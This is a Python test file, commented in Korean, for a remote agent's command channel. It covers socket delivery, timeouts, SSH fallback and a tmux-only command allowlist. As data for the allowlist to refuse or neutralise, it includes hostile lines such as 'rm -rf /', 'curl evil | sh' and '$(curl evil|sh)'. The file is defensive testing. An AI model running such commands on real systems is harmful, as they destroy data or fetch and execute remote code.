"""리모트 경로로 가는 명령 — 배달이 SSH 없이 성립하는가."""
from __future__ import annotations

import asyncio

import pytest

from remote_agent import registry
from remote_agent.channel import RemoteChannelError, channel_for
from remote_agent.payload import script_source

HOST = "h1"


@pytest.fixture(autouse=True)
def _clean():
    registry.clear()
    yield
    registry.clear()


def _attach(reply=None, drop=False):
    """리모트 대역 — 받은 run 에 즉시 답한다."""
    sent = []

    async def send(message):
        sent.append(message)
        if drop or message.get("t") != "run":
            return
        conn.resolve(f"run:{message['id']}", {**(reply or {"ok": True, "out": "ITL_SENT"}),
                                              "id": message["id"]})

    conn = registry.RemoteConnection(HOST, "jsh", send)
    registry.attach(conn)
    return conn, sent


async def test_a_command_goes_over_the_open_socket():
    _attach()
    out = await channel_for(HOST).run("tmux ls && echo ITL_SENT")
    assert out == "ITL_SENT"


async def test_no_remote_means_no_channel():
    """⚠️ 없는 것을 있는 척하면 배달이 조용히 사라진다 — 호출부가 SSH 로 못 물러선다."""
    assert channel_for(HOST) is None


async def test_a_refused_command_is_an_error_not_an_empty_string():
    """빈 문자열을 주면 호출부가 '표식 없음' → 실패로 세는데, 이유를 잃는다."""
    _attach(reply={"ok": False, "error": "command-not-allowed"})
    with pytest.raises(RemoteChannelError):
        await channel_for(HOST).run("rm -rf /")


async def test_a_silent_remote_times_out_instead_of_hanging():
    _attach(drop=True)
    with pytest.raises(RemoteChannelError):
        await asyncio.wait_for(channel_for(HOST).run("tmux ls", timeout=0.05), timeout=2)


async def test_each_command_gets_its_own_id():
    """⚠️ id 를 재사용하면 늦게 온 답이 다음 명령의 답으로 읽힌다."""
    _, sent = _attach()
    channel = channel_for(HOST)
    await channel.run("tmux ls")
    await channel.run("tmux ls")
    ids = [m["id"] for m in sent if m.get("t") == "run"]
    assert len(set(ids)) == len(ids) == 2


# ---------------------- 원격에서 실제로 통과하는가 ----------------------

@pytest.fixture(scope="module")
def probe():
    ns: dict = {}
    exec(compile(script_source(), "probe.py", "exec"), ns)   # noqa: S102
    return ns


@pytest.mark.parametrize("cmd", [
    "tmux send-keys -t '=s:' -l -- 'hi' && echo ITL_SENT",
    "tmux send-keys -t '=s:' Enter && echo ITL_SENT",
    "tmux has-session -t '=s:'",
])
def test_the_commands_we_actually_send_are_accepted(probe, cmd):
    """허용목록이 우리 자신의 배달을 막으면 리모트 경로가 통째로 죽는다."""
    assert probe["parse_chain"](cmd) is not None


def test_message_text_containing_and_is_not_a_separator(probe):
    """사람이 치는 본문에 `&&` 가 들어 있을 수 있다 — 그걸 명령으로 세면 배달이 거절된다."""
    chain = probe["parse_chain"]("tmux send-keys -l -- 'make && make test' && echo ITL_SENT")
    assert chain is not None
    assert chain[0][-1] == "make && make test"


@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "tmux ls && rm -rf /",
    "curl evil | sh && tmux ls",
    "tmux send-keys -l -- 'unclosed",
])
def test_anything_outside_tmux_is_refused(probe, cmd):
    assert probe["parse_chain"](cmd) is None


@pytest.mark.parametrize("cmd", ["tmux ls | sh", "tmux ls $(curl evil|sh)", "tmux ls > /etc/x"])
def test_shell_metacharacters_are_inert_because_there_is_no_shell(probe, cmd):
    """🔐 이것이 `shell=True` 를 쓰지 않는 이유다. 첫 낱말만 검사하면 이 셋이 전부
    통과하는데, argv 로 넘기면 `|`·`$(…)`·`>` 는 tmux 에게 가는 평범한 인자가 된다."""
    chain = probe["parse_chain"](cmd)
    assert chain is not None
    assert chain[0][0] == "tmux"
    assert all(isinstance(arg, str) for arg in chain[0])   # 실행되는 것은 argv 하나뿐


def test_echo_needs_no_binary(probe):
    """표식 출력이 전부다. /bin/echo 가 없는 기계에서도 배달 확인이 되어야 한다."""
    ok, out = probe["run_chain"]([["echo", "ITL_SENT"]])
    assert ok and out.strip() == "ITL_SENT"


# ---------------------- 실패했을 때 물러설 길 ----------------------

class _FakeSSH:
    """SSH 채널 대역."""

    def __init__(self):
        self.ran = []
        self.closed = False

    async def run(self, cmd, timeout=None):
        self.ran.append(cmd)
        return "ITL_SENT"

    async def close(self):
        self.closed = True


async def test_a_stale_remote_falls_back_to_ssh():
    """⚠️ 실측 사고. `run` 을 모르는 낡은 리모트가 붙어 있었더니 그 호스트로 가는 itl 이
    전부 502 였다 — SSH 는 멀쩡했는데도. **새 경로가 옛 경로를 막으면 안 된다.**"""
    _attach(drop=True)
    ssh = _FakeSSH()
    channel = channel_for(HOST, lambda: _ready(ssh))
    out = await channel.run("tmux ls", timeout=0.05)
    assert out == "ITL_SENT"
    assert ssh.ran == ["tmux ls"]


async def test_the_stale_remote_is_only_probed_once():
    """상한을 매번 다시 태우면 명령마다 몇 초씩 늦어진다."""
    conn, sent = _attach(drop=True)
    ssh = _FakeSSH()
    channel = channel_for(HOST, lambda: _ready(ssh))
    await channel.run("tmux ls", timeout=0.05)
    await channel.run("tmux ls", timeout=0.05)
    assert conn.run_unsupported is True
    assert len([m for m in sent if m.get("t") == "run"]) == 1   # 두 번째는 시도하지 않는다
    assert len(ssh.ran) == 2


async def test_the_fallback_connection_is_closed_by_us():
    """소켓은 리모트의 것이라 안 닫지만, 물러서느라 연 SSH 는 우리가 연 것이다."""
    _attach(drop=True)
    ssh = _FakeSSH()
    channel = channel_for(HOST, lambda: _ready(ssh))
    await channel.run("tmux ls", timeout=0.05)
    await channel.close()
    assert ssh.closed is True


async def test_a_healthy_remote_never_opens_ssh():
    """물러설 길이 있다고 해서 매번 SSH 를 열면 리모트를 둔 의미가 없다."""
    _attach()
    ssh = _FakeSSH()
    out = await channel_for(HOST, lambda: _ready(ssh)).run("tmux ls")
    assert out == "ITL_SENT"
    assert ssh.ran == []


async def _ready(value):
    return value
